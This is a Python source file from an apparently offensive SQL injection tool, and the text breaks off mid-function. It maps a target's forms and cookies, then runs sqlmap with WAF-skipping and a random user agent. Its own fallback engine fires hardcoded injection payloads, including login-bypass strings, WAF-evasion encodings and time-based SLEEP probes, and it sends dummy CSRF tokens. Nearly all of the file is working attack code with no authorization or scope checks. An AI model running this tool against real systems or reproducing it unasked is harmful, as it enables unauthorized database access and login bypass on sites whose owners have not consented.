import os
import re
import json
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import Dict, Any, Optional, List, Tuple

# yaml is optional for strategies; handle missing gracefully
try:
    import yaml
except Exception:
    yaml = None

from exploits.base_exploit import BaseExploit
from core.target import Vulnerability
from utils.http_client import HTTPClient


class TargetAnalyzer:
    """Analyze target URL to find all testable parameters"""
    def __init__(self):
        self.http_client = HTTPClient()

    def analyze(self, url: str) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs

        analysis = {
            'url': url,
            'get_params': [],
            'post_params': [],
            'cookies': {},
            'forms': []
        }

        try:
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                analysis['get_params'] = list(params.keys())

            response = self.http_client.get(url, raise_for_status=False)

            if getattr(response, 'cookies', None):
                analysis['cookies'] = dict(response.cookies)

            forms = self._extract_forms(response.text if response else '', url)
            analysis['forms'] = forms

            for form in forms:
                analysis['post_params'].extend(form.get('inputs', []))

            analysis['post_params'] = list(set(analysis['post_params']))

        except Exception as e:
            print(f"[!] Target analysis warning: {e}")

        return analysis

    def _extract_forms(self, html: str, base_url: str) -> List[Dict[str, Any]]:
        forms = []
        try:
            from bs4 import BeautifulSoup
            from urllib.parse import urlparse

            soup = BeautifulSoup(html, 'html.parser')

            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }

                if form_data['action']:
                    if not form_data['action'].startswith('http'):
                        parsed = urlparse(base_url)
                        if form_data['action'].startswith('/'):
                            form_data['action'] = f"{parsed.scheme}://{parsed.netloc}{form_data['action']}"
                        else:
                            form_data['action'] = f"{parsed.scheme}://{parsed.netloc}/{form_data['action']}"
                else:
                    form_data['action'] = base_url

                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_name = input_tag.get('name')
                    if input_name:
                        form_data['inputs'].append(input_name)

                if form_data['inputs']:
                    forms.append(form_data)

        except ImportError:
            print("[!] BeautifulSoup not installed - form detection disabled")
            print("[!] Install: pip install beautifulsoup4")
        except Exception:
            pass

        return forms


class SQLMapWrapper:
    """Wrapper for SQLMap with aggressive configuration"""
    def __init__(self, config: dict = None):
        self.config = config or {}
        self.sqlmap_cmd = self._resolve_sqlmap_command()
        self.output_dir = Path(tempfile.gettempdir()) / 'graytera_sqlmap'
        self.output_dir.mkdir(exist_ok=True)

    def _resolve_sqlmap_command(self) -> Optional[List[str]]:
        config_path = self.config.get('path')
        if config_path and str(config_path).strip() and str(config_path).strip() != 'null':
            cmd = self._normalize_candidate(config_path)
            if self._validate_sqlmap(cmd):
                print(f"[*] Using SQLMap from config: {config_path}")
                return cmd

        env_path = os.getenv('SQLMAP_PATH')
        if env_path:
            cmd = self._normalize_candidate(env_path)
            if self._validate_sqlmap(cmd):
                print(f"[*] Using SQLMap from SQLMAP_PATH: {env_path}")
                return cmd

        candidates = self._default_sqlmap_candidates()
        for candidate in candidates:
            cmd = self._normalize_candidate(candidate)
            if self._validate_sqlmap(cmd):
                print(f"[*] Using SQLMap found at: {cmd}")
                return cmd

        return None

    def _default_sqlmap_candidates(self) -> List[List[str]]:
        python_exec = sys.executable or 'python'
        scripts_dir = Path(python_exec).parent / ('Scripts' if os.name == 'nt' else 'bin')
        possible_paths = []

        dev_paths = [
            'B:\\sqlmap\\sqlmap-dev\\sqlmap.py',
            '/home/sqlmap/sqlmap-dev/sqlmap.py',
        ]
        for path in dev_paths:
            if Path(path).exists():
                possible_paths.append(path)

        possible_paths.extend([
            shutil.which('sqlmap'),
            shutil.which('sqlmap.py'),
            str(scripts_dir / 'sqlmap'),
            str(scripts_dir / 'sqlmap.py'),
            str(Path.home() / 'sqlmap' / 'sqlmap.py'),
            '/usr/bin/sqlmap',
            '/usr/local/bin/sqlmap',
        ])

        try:
            import sqlmap  # type: ignore
            sqlmap_pkg_dir = Path(sqlmap.__file__).parent
            sqlmap_py = sqlmap_pkg_dir / 'sqlmap.py'
            if sqlmap_py.exists():
                possible_paths.append(str(sqlmap_py))
        except Exception:
            pass

        possible_paths = list(dict.fromkeys([p for p in possible_paths if p]))
        candidates: List[List[str]] = [
            ['sqlmap'],
            ['sqlmap.py'],
            [python_exec, '-m', 'sqlmap'],
            [python_exec.replace('pythonw', 'python'), '-m', 'sqlmap'],
            ['python', '-m', 'sqlmap'],
            ['python3', '-m', 'sqlmap'],
        ]

        for path in possible_paths:
            candidates.append([path])
            candidates.append([python_exec, path])

        return candidates

    def _normalize_candidate(self, candidate: Any) -> Optional[List[str]]:
        if not candidate:
            return None
        if isinstance(candidate, list):
            return candidate
        if isinstance(candidate, tuple):
            return list(candidate)
        candidate = str(candidate).strip()
        if not candidate:
            return None
        if candidate.endswith('.py'):
            python_exec = sys.executable or 'python'
            tokens = shlex.split(candidate, posix=os.name != 'nt')
            return [python_exec] + tokens if tokens else None
        tokens = shlex.split(candidate, posix=os.name != 'nt')
        return tokens if tokens else None

    def _validate_sqlmap(self, base_cmd: Optional[List[str]]) -> bool:
        if not base_cmd:
            return False
        try:
            cmd = base_cmd + ['--version']
            result = subprocess.run(cmd, capture_output=True, timeout=5, text=True, input='\n')
            combined = (result.stdout + result.stderr).lower()
            if result.returncode == 0:
                if any(c.isdigit() for c in result.stdout):
                    return True
                if 'sqlmap' in combined:
                    return True
                executable = base_cmd[0].lower()
                if 'sqlmap' in executable:
                    return True
            return False
        except (OSError, subprocess.SubprocessError):
            return False

    def run_full_scan(self, url: str, analysis: Dict[str, Any] = None) -> Dict[str, Any]:
        """Run SQLMap with balanced aggressiveness and POST support"""
        if not self.sqlmap_cmd:
            self.sqlmap_cmd = self._resolve_sqlmap_command()

        if not self.sqlmap_cmd:
            print(f"[!] SQLMap not installed. Skipping layer 2. Install: pip install sqlmap")
            return {
                'success': False,
                'vulnerable': False,
                'error': 'SQLMap not found. Install: pip install sqlmap',
                'skipped': True
            }

        session_name = f"graytera_{abs(hash(url))}"
        output_path = self.output_dir / session_name

        # Defaults - change timeout here if you want longer scan
        level = min(self.config.get('level', 5), 3)
        risk = min(self.config.get('risk', 3), 2)
        threads = self.config.get('threads', 8)
        timeout = min(self.config.get('timeout', 600), 90)  # default 90s

        cmd = self.sqlmap_cmd + [
            '-u', url,
            '--batch',
            '--random-agent',
            f'--level={level}',
            f'--risk={risk}',
            '--technique=BEUSTQ',
            f'--threads={threads}',
            '--time-sec=2',
            '--skip-waf',
            '--flush-session',
        ]

        params_to_test = []
        if analysis:
            params_to_test.extend(analysis.get('get_params', []) or [])
            params_to_test.extend(analysis.get('post_params', []) or [])
        if params_to_test:
            cmd.extend(['-p', ','.join(sorted(set(params_to_test)))])

        if analysis and analysis.get('forms'):
            first_form = analysis['forms'][0]
            form_inputs = first_form.get('inputs') or analysis.get('post_params', [])
            if form_inputs:
                data_pairs = [f"{p}=INJECT" for p in form_inputs]
                data_str = '&'.join(data_pairs)
                cmd.extend(['--data', data_str])

        if analysis and analysis.get('cookies'):
            cookie_str = '; '.join([f"{k}={v}" for k, v in analysis['cookies'].items()])
            cmd.extend(['--cookie', cookie_str])

        try:
            print(f"[*] Running SQLMap (Level={level}, Risk={risk})...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=str(self.output_dir))
            output_data = self._parse_sqlmap_output(output_path, result.stdout, result.stderr)

            if not output_data.get('vulnerable'):
                json_result = self._check_sqlmap_json_output(output_path)
                if json_result.get('vulnerable'):
                    output_data = json_result

            if output_data.get('vulnerable'):
                output_data['success'] = True
                return output_data
            else:
                return {'success': False, 'vulnerable': False, 'error': 'No SQL injection found'}

        except subprocess.TimeoutExpired:
            return {'success': False, 'error': f'SQLMap timeout ({timeout}s)'}
        except Exception as e:
            return {'success': False, 'error': f'SQLMap error: {str(e)}'}

    def _parse_sqlmap_output(self, output_path: Path, stdout: str, stderr: str) -> Dict[str, Any]:
        data = {
            'vulnerable': False,
            'injection_points': [],
            'injection_types': [],
            'payloads': [],
            'dbms': None,
            'current_user': None,
            'current_db': None,
            'databases': [],
            'is_dba': False,
        }
        combined = (stdout + stderr).lower()

        if 'resumed the following injection point' in combined or 'resuming back-end dbms' in combined:
            data['vulnerable'] = True
            dbms_match = re.search(r"back-end\s+(?:DBMS|dbms)\s*:\s*([^\n]+)", stdout, re.IGNORECASE)
            if dbms_match:
                data['dbms'] = dbms_match.group(1).strip()
            params = re.findall(r"Parameter:\s*([^\n]+)", stdout, re.IGNORECASE)
            if params:
                data['injection_points'] = [p.strip() for p in params]
            return data

        vulnerability_indicators = [
            r"parameter\s+[\"']?[\w\[\]]+[\"']?\s+is\s+vulnerable",
            r"sqlmap identified the following injection point",
            r"injection\s+point\s+found",
            r"(?:boolean|union|error|time|stacked).*?(?:injectable|vulnerable|confirmed)",
            r"\bvulnerable\s+to",
        ]
        for pattern in vulnerability_indicators:
            if re.search(pattern, combined, re.IGNORECASE | re.MULTILINE):
                data['vulnerable'] = True
                break

        params = set()
        for pat in [r"parameter[:\s]+['\"]?(\w+)['\"]?", r"[*]\s+(?:get|post)\s+parameter[:\s]+['\"]?(\w+)['\"]?"]:
            for m in re.findall(pat, stdout, re.IGNORECASE):
                params.add(m)
        data['injection_points'] = list(params)

        dbms_match = re.search(r"back-end\s+DBMS\s*:\s*([^\n,]+)", stdout, re.IGNORECASE)
        if dbms_match:
            data['dbms'] = dbms_match.group(1).strip()

        if re.search(r'union.*select', combined, re.IGNORECASE):
            data['injection_types'].append('union-based')
        if re.search(r'boolean.*blind', combined, re.IGNORECASE):
            data['injection_types'].append('boolean-based blind')
        if re.search(r'time.*sleep', combined, re.IGNORECASE):
            data['injection_types'].append('time-based blind')

        payloads = re.findall(r"payload\s*:\s*([^\n]+)", stdout, re.IGNORECASE)
        data['payloads'] = [p.strip() for p in payloads] if payloads else []

        user_match = re.search(r"current\s+(?:database\s+)?user\s*:\s*['\"]?([^\n'\"]+)", stdout, re.IGNORECASE)
        if user_match:
            data['current_user'] = user_match.group(1).strip()

        db_match = re.search(r"current\s+database\s*:\s*['\"]?([^\n'\"]+)", stdout, re.IGNORECASE)
        if db_match:
            data['current_db'] = db_match.group(1).strip()

        if any(phrase in stdout.lower() for phrase in ['current user is dba', 'is dba', 'admin privilege']):
            data['is_dba'] = True

        return data

    def _check_sqlmap_json_output(self, output_path: Path) -> Dict[str, Any]:
        data = {
            'vulnerable': False,
            'injection_points': [],
            'injection_types': [],
            'payloads': [],
            'dbms': None,
            'current_user': None,
            'current_db': None,
            'databases': [],
            'is_dba': False,
        }
        try:
            target_dir = None
            if output_path.exists():
                for item in output_path.iterdir():
                    if item.is_dir():
                        target_dir = item
                        break
            if not target_dir:
                return data

            json_files = [target_dir / 'target.json', target_dir / 'dump.json', target_dir / 'scan.json']
            for jf in json_files:
                if not jf.exists():
                    continue
                try:
                    with open(jf, 'r', encoding='utf-8') as fh:
                        jd = json.load(fh)
                    if isinstance(jd, dict) and jd.get('vulnerable'):
                        data['vulnerable'] = True
                    if isinstance(jd, dict) and 'injection_data' in jd:
                        for inj in jd['injection_data']:
                            if inj.get('vulnerable'):
                                data['vulnerable'] = True
                                if inj.get('parameter'):
                                    data['injection_points'].append(inj['parameter'])
                                if inj.get('technique'):
                                    data['injection_types'].append(inj['technique'])
                                if inj.get('payload'):
                                    data['payloads'].append(inj['payload'])
                    if data['vulnerable']:
                        return data
                except Exception:
                    continue
        except Exception:
            pass
        return data


class CustomSQLiExploit:
    """Custom exploitation fallback supporting POST and login-bypass detection"""
    def __init__(self):
        self.http_client = HTTPClient(timeout=10)
        self.payloads = [
            "' UNION SELECT NULL--",
            "' OR '1'='1",
            "' OR 1=1--",
            "') OR ('1'='1",
            " OR 1=1 --",
            "admin' --",
            "' AND SLEEP(2)--",
            "' OR SLEEP(2)--",
            "' AND extractvalue(0,concat(0x7e,version()))--",
            "%252527 OR %252527%25273%252527=%252527%25273",
            "' /*!50000OR */ '1'='1",
            "' OR 1=1 LIMIT 1--",
        ]
        self.detail_keyword = 'View details'
        self.strategies = self._load_strategies()
        self._test_lock = None

    def _load_strategies(self) -> List[Dict[str, Any]]:
        """Load advanced strategy definitions from YAML or return defaults"""
        if yaml is None:
            # YAML not installed: return defaults
            return self._default_strategies()
        path = Path('payloads') / 'sqli_strategies.yaml'
        if path.exists():
            try:
                with open(path, 'r', encoding='utf-8') as handle:
                    data = yaml.safe_load(handle) or {}
                    return data.get('strategies', []) or self._default_strategies()
            except Exception as exc:
                print(f"[!] Failed to load SQLi strategies: {exc}")
                return self._default_strategies()
        return self._default_strategies()

    def _default_strategies(self) -> List[Dict[str, Any]]:
        return [
            {
                'name': 'basic_hidden_data',
                'description': 'Detect hidden data by counting product cards.',
                'target': 'query',
                'detection': {
                    'type': 'length_delta',
                    'min_delta': 500
                },
                'payloads': ["' OR '1'='1"]
            }
        ]

    # exploit, test_login_bypass, _test_param_payloads, _fetch_baseline, _check_vulnerability,
    # _run_strategies, _run_query_strategy, _run_cookie_strategy, _evaluate_detection
    # (implementations follow ‚Äî these are the same robust implementations as before)

    def exploit(self, url: str, analysis: Dict[str, Any], config: Dict[str, Any] = None) -> Dict[str, Any]:
        import threading

        config = config or {}
        max_threads = config.get('max_threads', 8)
        timeout = config.get('timeout', 30)
        priority_params = config.get('priority_params', [])

        result = {
            'success': False,
            'tested_params': 0,
            'working_payloads': [],
            'vulnerable_params': [],
            'strategies_checked': 0
        }

        # early login-bypass check
        try:
            login_check = self.test_login_bypass(url, analysis.get('forms', []), timeout=timeout)
            if login_check.get('success'):
                result['success'] = True
                result['working_payloads'].append({
                    'param': 'login_bypass',
                    'payload': login_check.get('details', []),
                    'type': 'LOGIN_BYPASS',
                    'reason': login_check.get('evidence', '')
                })
                result['vulnerable_params'].append('login_bypass')
                return result
        except Exception:
            pass

        baseline = self._fetch_baseline(url, timeout)
        strategy_hits, strategy_tests = self._run_strategies(url, analysis, baseline)
        result['tested_params'] += strategy_tests
        result['strategies_checked'] = len(self.strategies)

        if strategy_hits:
            result['success'] = True
            result['working_payloads'].extend(strategy_hits)
            result['vulnerable_params'].extend([item['param'] for item in strategy_hits if item.get('param')])
            return result

        # Build testing_params: prefer priority list, else GET + POST
        if priority_params:
            testing_params = [p for p, _ in priority_params]
        else:
            testing_params = (analysis.get('get_params', []) or []) + (analysis.get('post_params', []) or [])
        testing_params = list(dict.fromkeys(testing_params))  # dedupe preserving order

        if not testing_params:
            return result

        self._test_lock = threading.Lock()
        threads = []

        for param in testing_params:
            thread = threading.Thread(
                target=self._test_param_payloads,
                args=(param, url, baseline, result, timeout, analysis)
            )
            threads.append(thread)
            thread.daemon = True
            thread.start()

            if len(threads) >= max_threads:
                for t in threads:
                    t.join(timeout=2)
                threads = [t for t in threads if t.is_alive()]

        for t in threads:
            t.join(timeout=timeout)
            if result['success'] and config.get('early_exit', True):
                break

        return result

    def test_login_bypass(self, url: str, forms: List[Dict[str, Any]], timeout: float = 10) -> Dict[str, Any]:
        from urllib.parse import urlparse
        result = {'success': False, 'evidence': '', 'details': []}

        candidate_user_fields = {'username', 'user', 'email', 'login', 'userid', 'user_id', 'uname', 'emailaddress'}
        candidate_pass_fields = {'password', 'pass', 'pwd', 'passwd'}

        login_forms = []
        for form in forms or []:
            method = form.get('method', 'GET').upper()
            if method != 'POST':
                continue
            inputs = set([n.lower() for n in form.get('inputs', [])])
            has_user = bool(candidate_user_fields & inputs)
            has_pass = bool(candidate_pass_fields & inputs)
            if has_user or has_pass:
                login_forms.append(form)

        if not login_forms:
            return result

        auth_payloads = [
            "' OR '1'='1' -- ",
            "' OR '1'='1' #",
            "\" OR \"1\"=\"1\" -- ",
            "' OR 1=1 -- ",
            "admin' -- ",
            "' OR 'x'='x",
            "%27%20OR%20%271%27%3D%271%27%20--%20",
        ]

        for form in login_forms:
            action = form.get('action') or url
            if not action.startswith('http'):
                parsed = urlparse(url)
                action = f"{parsed.scheme}://{parsed.netloc}{action}" if action.startswith('/') else f"{parsed.scheme}://{parsed.netloc}/{action}"

            baseline_resp = None
            try:
                baseline_data = {}
                for n in form.get('inputs', []):
                    nl = n.lower()
                    if nl in candidate_user_fields:
                        baseline_data[n] = 'invalid_user_zzzz'
                    elif nl in candidate_pass_fields:
                        baseline_data[n] = 'invalid_pass_zzzz'
                    else:
                        baseline_data[n] = 'test'
                baseline_resp = self.http_client.post(action, data=baseline_data, timeout=timeout, raise_for_status=False)
            except Exception:
                baseline_resp = None

            baseline_text = baseline_resp.text if baseline_resp else ''
            baseline_status = baseline_resp.status_code if baseline_resp else None
            baseline_cookies = dict(baseline_resp.cookies) if baseline_resp and getattr(baseline_resp, 'cookies', None) else {}

            for payload in auth_payloads:
                try:
                    post_data = {}
                    for n in form.get('inputs', []):
                        nl = n.lower()
                        if nl in candidate_user_fields:
                            post_data[n] = payload
                        elif nl in candidate_pass_fields:
                            post_data[n] = 'random_pass_zz'
                        else:
                            post_data[n] = 'test'

                    resp = self.http_client.post(action, data=post_data, timeout=timeout, raise_for_status=False)

                    if resp is not None and resp.status_code in (301, 302) and baseline_status not in (301, 302):
                        result['success'] = True
                        result['evidence'] = f"Redirect detected: baseline {baseline_status} -> {resp.status_code}; Location: {resp.headers.get('Location')}"
                        result['details'].append({'action': action, 'payload': payload, 'type': 'redirect', 'resp': resp})
                        return result

                    resp_cookies = dict(resp.cookies) if resp and getattr(resp, 'cookies', None) else {}
                    if resp_cookies and resp_cookies != baseline_cookies:
                        result['success'] = True
                        result['evidence'] = f"Session cookie changed/issued: {list(resp_cookies.keys())}"
                        result['details'].append({'action': action, 'payload': payload, 'type': 'cookie', 'resp': resp})
                        return result

                    text = resp.text.lower() if resp and resp.text else ''
                    baseline_lower = baseline_text.lower() if baseline_text else ''
                    success_indicators = ['logout', 'sign out', 'signout', 'dashboard', 'welcome', 'my account', 'profile', 'admin']
                    for ind in success_indicators:
                        if ind in text and ind not in baseline_lower:
                            result['success'] = True
                            result['evidence'] = f"Found success indicator '{ind}' in response body"
                            result['details'].append({'action': action, 'payload': payload, 'type': 'indicator', 'indicator': ind, 'resp': resp})
                            return result

                    if 'invalid' in baseline_lower and 'invalid' not in text:
                        result['success'] = True
                        result['evidence'] = "Invalid credential message disappeared after payload (content delta)"
                        result['details'].append({'action': action, 'payload': payload, 'type': 'content_delta', 'resp': resp})
                        return result

                    if baseline_resp and abs(len(text) - len(baseline_lower)) > max(200, len(baseline_lower) * 0.2):
                        result['success'] = True
                        result['evidence'] = f"Large content length delta: baseline {len(baseline_lower)} -> {len(text)}"
                        result['details'].append({'action': action, 'payload': payload, 'type': 'length_delta', 'resp': resp})
                        return result

                except Exception:
                    continue

        return result

    def _test_param_payloads(self, param: str, url: str, baseline: Optional[Dict[str, Any]],
                             result: Dict[str, Any], timeout: float, analysis: Dict[str, Any]):
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        forms_with_param = []
        for form in (analysis.get('forms') or []):
            if param in form.get('inputs', []):
                forms_with_param.append(form)

        if forms_with_param:
            for form in forms_with_param:
                action = form.get('action') or url
                if not action.startswith('http'):
                    parsed = urlparse(url)
                    action = f"{parsed.scheme}://{parsed.netloc}{action}" if action.startswith('/') else f"{parsed.scheme}://{parsed.netloc}/{action}"

                for payload in self.payloads:
                    if result['success']:
                        return
                    try:
                        post_data = {}
                        for name in form.get('inputs', []):
                            if name == param:
                                post_data[name] = payload
                            else:
                                nl = name.lower()
                                if 'csrf' in nl or 'token' in nl:
                                    post_data[name] = '0000'
                                else:
                                    post_data[name] = 'test'
                        resp = self.http_client.post(action, data=post_data, timeout=timeout, raise_for_status=False)
                        is_vul, reason = self._check_vulnerability(resp, baseline)
                        with self._test_lock:
                            result['tested_params'] = result.get('tested_params', 0) + 1
                        if is_vul:
                            with self._test_lock:
                                if not result['success']:
                                    result['success'] = True
                                    result['working_payloads'].append({
                                        'param': param,
                                        'payload': payload,
                                        'type': 'POST',
                                        'reason': reason,
                                        'strategy': 'form_post'
                                    })
                                    result['vulnerable_params'].append(param)
                                    return
                    except Exception:
                        with self._test_lock:
                            result['tested_params'] = result.get('tested_params', 0) + 1
                        continue
            return

        # fallback get
        for payload in self.payloads:
            if result['success']:
                return
            try:
                parsed = urlparse(url)
                params_map = parse_qs(parsed.query)
                params_map[param] = [payload]
                new_query = urlencode(params_map, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                response = self.http_client.get(test_url, timeout=timeout, raise_for_status=False)
                is_vul, reason = self._check_vulnerability(response, baseline)
                with self._test_lock:
                    result['tested_params'] = result.get('tested_params', 0) + 1
                if is_vul:
                    with self._test_lock:
                        if not result['success']:
                            result['success'] = True
                            result['working_payloads'].append({
                                'param': param,
                                'payload': payload,
                                'type': 'GET',
                                'reason': reason,
                                'strategy': 'baseline_delta_get'
                            })
                            result['vulnerable_params'].append(param)
                            return
            except Exception:
                with self._test_lock:
                    result['tested_params'] = result.get('tested_params', 0) + 1
                continue

    def _fetch_baseline(self, url: str, timeout: float = 10) -> Optional[Dict[str, Any]]:
        try:
            response = self.http_client.get(url, timeout=timeout, raise_for_status=False)
            text_sample = response.text[:10000] if response and response.text else ''
            text_lower = response.text.lower() if response and response.text else ''
            keywords = {}
            for keyword in ['product', 'item', 'record', 'result', 'data', 'value', 'name', 'title']:
                keywords[keyword] = response.text.lower().count(keyword) if response and response.text else 0
            return {
                'status': response.status_code if response else None,
                'length': len(response.text) if response and response.text else 0,
                'detail_count': response.text.count(self.detail_keyword) if response and response.text else 0,
                'text': text_sample,
                'text_sample': (response.text[:200] if response and response.text else ''),
                'keywords': keywords,
                'has_errors': any(err in text_lower for err in ['error', 'exception', 'fatal']),
                'html_tags': response.text.count('<') if response and response.text else 0,
                'tables': response.text.count('<table') if response and response.text else 0,
                'rows': response.text.count('<tr') if response and response.text else 0,
                'cols': response.text.count('<td') if response and response.text else 0
            }
        except Exception:
            return None

    def _check_vulnerability(self, response, baseline: Optional[Dict[str, Any]]) -> Tuple[bool, str]:
        response_text = response.text if response and getattr(response, 'text', None) else ''
        text_lower = response_text.lower() if response_text else ''
        error_indicators = [
            'sql syntax', 'mysql', 'syntax error', 'database error',
            'you have an error', 'quoted string', 'unexpected end',
            'column count doesn', 'sqlstate', 'driver',
            'postgresql', 'oracle', 'sqlite', 'sql server',
            'parse error', 'division by zero', 'invalid value',
            'constraint violation'
        ]
        for indicator in error_indicators:
            if indicator in text_lower:
                return True, f"üìç Error-based: '{indicator}' keyword found"

        if baseline and response and response.status_code != baseline.get('status'):
            if response.status_code in [200, 500] and baseline.get('status') in [200, 500]:
                if response.status_code == 500 and baseline.get('status') == 200:
                    return True, f"‚ö†Ô∏è  Error-based: Status changed {baseline.get('status')} ‚Üí {response.status_code}"

        if baseline:
            length_diff = len(response_text) - (baseline.get('length') or 0)
            if length_diff > max(200, (baseline.get('length') or 0) * 0.3):
                return True, f"üîç Content-based: response length increased by {length_diff} chars"

            if length_diff > max(50, (baseline.get('length') or 0) * 0.1) and abs(length_diff) > 10:
                if length_diff > 0:
                    return True, f"üîç Content-based: response length increased by {length_diff} chars"

            current_detail = response_text.count(self.detail_keyword)
            if current_detail > (baseline.get('detail_count') or 0) and current_detail - (baseline.get('detail_count') or 0) >= 3:
                return True, f"üìà Data extraction: detail count increased"

        text_keywords = ['product', 'item', 'record', 'result', 'data', 'value']
        if baseline:
            baseline_keywords = baseline.get('keywords', {})
            for keyword in text_keywords:
                current_count = response_text.lower().count(keyword)
                baseline_count = baseline_keywords.get(keyword, 0)
                if current_count > baseline_count + 2:
                    return True, f"üìä Data extraction: '{keyword}' increased"

        return False, ''

    def _run_strategies(self, url: str, analysis: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> Tuple[List[Dict[str, Any]], int]:
        hits: List[Dict[str, Any]] = []
        tested = 0
        for strategy in self.strategies:
            target = strategy.get('target', 'query')
            if target == 'query':
                strategy_hits, strategy_tests = self._run_query_strategy(strategy, url, analysis, baseline)
            elif target == 'cookie':
                strategy_hits, strategy_tests = self._run_cookie_strategy(strategy, url, analysis, baseline)
            else:
                continue
            tested += strategy_tests
            hits.extend(strategy_hits)
        return hits, tested

    def _run_query_strategy(self, strategy: Dict[str, Any], url: str, analysis: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> Tuple[List[Dict[str, Any]], int]:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        hits: List[Dict[str, Any]] = []
        tested = 0
        params = analysis.get('get_params', [])
        hint = strategy.get('param')
        if hint:
            params = [p for p in params if p.lower() == hint.lower()]

        if not params:
            return hits, tested

        for param in params:
            for payload in strategy.get('payloads', []):
                tested += 1
                try:
                    parsed = urlparse(url)
                    params_map = parse_qs(parsed.query)
                    params_map[param] = [payload]
                    new_query = urlencode(params_map, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                    response = self.http_client.get(test_url, raise_for_status=False)
                    success, reason = self._evaluate_detection(strategy.get('detection', {}), response, baseline)
                    if success:
                        hits.append({
                            'param': param,
                            'payload': payload,
                            'type': 'GET',
                            'strategy': strategy.get('name'),
                            'reason': reason or strategy.get('description', 'strategy match')
                        })
                        break
                except Exception:
                    continue
        return hits, tested

    def _run_cookie_strategy(self, strategy: Dict[str, Any], url: str, analysis: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> Tuple[List[Dict[str, Any]], int]:
        hits: List[Dict[str, Any]] = []
        tested = 0
        cookie_name = strategy.get('cookie_name')
        cookies = analysis.get('cookies') or {}
        if not cookie_name or cookie_name not in cookies:
            return hits, tested

        base_value = cookies.get(cookie_name, '')
        for payload in strategy.get('payloads', []):
            tested += 1
            try:
                cookie_payload = f"{base_value}{payload}"
                cookie_jar = cookies.copy()
                cookie_jar[cookie_name] = cookie_payload
                response = self.http_client.get(url, cookies=cookie_jar, raise_for_status=False)
                success, reason = self._evaluate_detection(strategy.get('detection', {}), response, baseline)
                if success:
                    hits.append({
                        'param': cookie_name,
                        'payload': payload,
                        'type': 'COOKIE',
                        'strategy': strategy.get('name'),
                        'reason': reason or strategy.get('description', 'strategy match')
                    })
                    break
            except Exception:
                continue
        return hits, tested

    def _evaluate_detection(self, detection: Dict[str, Any], response, baseline: Optional[Dict[str, Any]]) -> Tuple[bool, str]:
        dtype = detection.get('type')
        baseline_text = (baseline or {}).get('text', '') if baseline else ''
        if dtype == 'conditional_error':
            threshold = detection.get('threshold', 500)
            if response.status_code >= threshold:
                return True, f"Conditional error: status code {response.status_code} >= {threshold}"
        elif dtype == 'keyword_delta':
            keyword = detection.get('keyword', '')
            min_delta = detection.get('min_delta', 1)
            base_count = baseline_text.count(keyword) if baseline_text else 0
            current = response.text.count(keyword)
            if current - base_count >= min_delta:
                return True, f"keyword '{keyword}' increased from {base_count} to {current}"
        elif dtype == 'length_delta':
            min_delta = detection.get('min_delta', 200)
            base_length = (baseline or {}).get('length', 0)
            diff = len(response.text) - base_length
            if diff >= min_delta:
                return True, f"response length increased by {diff} chars"
        elif dtype == 'keyword_presence':
            keyword = detection.get('keyword', '')
            if keyword and keyword in response.text:
                return True, f"keyword '{keyword}' detected in response"
        elif dtype == 'status_code':
            status = detection.get('status')
            allowed = detection.get('statuses')
            allowed_codes = allowed or ([status] if status else [])
            if allowed_codes and response.status_code in allowed_codes:
                return True, f"status code matched expected {response.status_code}"
        elif dtype == 'time_delay':
            threshold = detection.get('threshold', 5)
            elapsed = response.elapsed.total_seconds() if response.elapsed else 0
            if elapsed >= threshold:
                return True, f"response delayed {elapsed:.1f}s (threshold: {threshold}s)"
        elif dtype == 'error_keywords':
            keywords = detection.get('keywords', [
                'sql syntax',
                'mysql',
                'syntax error',
                'database error',
                'ORA-',
                'PostgreSQL',
                'SQLSTATE',
            ])
            text_lower = response.text.lower()
            for kw in keywords:
                if kw.lower() in text_lower:
                    return True, f"SQL error keyword found: '{kw}'"
        elif dtype == 'boolean_blind':
            base_length = (baseline or {}).get('length', 0)
            current_length = len(response.text)
            threshold = detection.get('threshold', 100)
            if abs(current_length - base_length) > threshold:
                return True, f"boolean-based blind: length changed by {abs(current_length - base_length)}"
        elif dtype == 'union_based':
            marker = detection.get('marker', 'NULL')
            if marker in response.text or 'null' in response.text.lower():
                return True, f"UNION-based injection detected (marker found)"
        elif dtype == 'tracking_cookie':
            welcome_keyword = detection.get('keyword', 'Welcome back')
            if welcome_keyword in response.text:
                return True, f"Tracking cookie injection successful (found: '{welcome_keyword}')"
        elif dtype == 'content_pattern':
            patterns = detection.get('patterns', [])
            for pattern in patterns:
                if pattern in response.text:
                    return True, f"Content pattern matched: '{pattern}'"
        return False, ''


class SQLiExploit(BaseExploit):
    """Main SQLi Exploit - 3-LAYER ARCHITECTURE"""
    def __init__(self, config: dict = None):
        super().__init__("SQLi Exploit (3-Layer Optimized)")
        self.config = config or {}
        self.config.setdefault('max_threads', 10)
        self.config.setdefault('layer2_timeout', 30)
        self.config.setdefault('early_exit', True)

        self.analyzer = TargetAnalyzer()
        self.sqlmap = SQLMapWrapper(self.config.get('sqlmap', {}))
        self.custom = CustomSQLiExploit()
        self.exploitation_cache = {}
    
    def execute_cve(self, cve_id: str, finding: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute exploit on all affected parameters of a CVE across all subdomains
        """
        exploited_params = []
        
        # Exploit each affected parameter (across all subdomains)
        for param_info in finding.get('affected_parameters', []):
            url = param_info['url']
            parameter = param_info['parameter']
            payloads = param_info.get('payloads', [])
            
            try:
                # Create a vulnerability object for this specific parameter
                vuln = Vulnerability(
                    vuln_type='sqli',
                    severity=finding['severity'],
                    url=url,
                    parameter=parameter,
                    payload=payloads[0] if payloads else '',
                    evidence=f"CVE {cve_id} exploitation",
